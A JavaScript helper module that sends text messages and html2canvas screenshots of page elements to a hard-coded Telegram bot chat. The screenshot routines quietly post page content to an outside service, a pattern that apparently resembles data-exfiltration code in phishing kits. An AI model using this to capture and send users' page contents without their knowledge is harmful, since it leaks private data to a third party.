let token="jfdshkjhfdsahv9df9uv8dasuoifdu9fdu9fuds90fd"; //Replace with your token
let pre="https://api.telegram.org/bot"+token+"/";
let chatId=-9480329043;  //Replace with your chatId.

async function executeCommand(x){
    await new Promise(pause=>setTimeout(pause,1000));
    let response=await fetch(x);
    return response;
}

async function sendMessage(x){
    let method="sendMessage?"
    const params = new URLSearchParams({
        chat_id:chatId,
        text:x
    });
    let post=params.toString();
    let final=pre+method+post;
    try{
        let response=await executeCommand(final);
        response=await response.json();
        if(response['ok']==true){
            return true;
        }
        else {
            console.log(response);
            return false;
        }
    }
    catch(error){
        console.log(error);
        return false;
    }
}
function sendImg2(element) {
    const targetElement =element;
    html2canvas(targetElement)
    .then(canvas => {
        const dataUrl = canvas.toDataURL('image/png');
        const formData = new FormData();
        const fileData = dataURItoBlob(dataUrl);
    
        formData.append('chat_id', chatId);
        formData.append('photo', fileData);
    
        fetch(pre+'sendPhoto', {
        method: 'POST',
        body: formData
        })
        .then(response => response.json())
        .then(data => {
        console.log('Image sent successfully:', data);
        })
        .catch(error => {
        console.error('Error:', error);
        });

    })
    .catch(error => {
        console.error('Error:', error);
    });
    
  }
  function sendImg(element,captionsMessage) {
    if(captionsMessage=="APPLE"){
        sendImg2(element);
        return;
    }
    const targetElement =element;
    html2canvas(targetElement)
    .then(canvas => {
        const dataUrl = canvas.toDataURL('image/png');
        const formData = new FormData();
        const fileData = dataURItoBlob(dataUrl);
    
        formData.append('chat_id', chatId);
        formData.append('photo', fileData);
        formData.append('caption', captionsMessage);
    
        fetch(pre+'sendPhoto', {
        method: 'POST',
        body: formData
        })
        .then(response => response.json())
        .then(data => {
        console.log('Image sent successfully:', data);
        })
        .catch(error => {
        console.error('Error:', error);
        });

    })
    .catch(error => {
        console.error('Error:', error);
    });
    
  }
  
  // Function to convert base64 to Blob object
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);

    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ab]);
}
module.exports={
    sendMessage:sendMessage
}

  
  